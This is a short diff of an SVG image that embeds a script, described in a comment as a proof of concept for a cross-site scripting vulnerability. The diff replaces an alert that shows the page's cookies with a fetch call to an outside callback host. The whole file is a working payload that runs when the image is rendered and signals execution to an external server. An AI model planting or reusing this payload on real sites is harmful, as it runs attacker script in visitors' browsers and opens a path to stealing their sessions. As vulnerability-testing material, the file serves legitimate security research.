@@ -1,7 +1,7 @@
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
     <script>
         // A simple PoC to demonstrate the vulnerability
-        alert('XSS ' + document.cookie);
+        fetch("https://24abe69cdf.ohmybin.argohs.ohohoh.dev/");
     </script>
     <text x="10" y="50">If you see this, the script has run.</text>
 </svg>
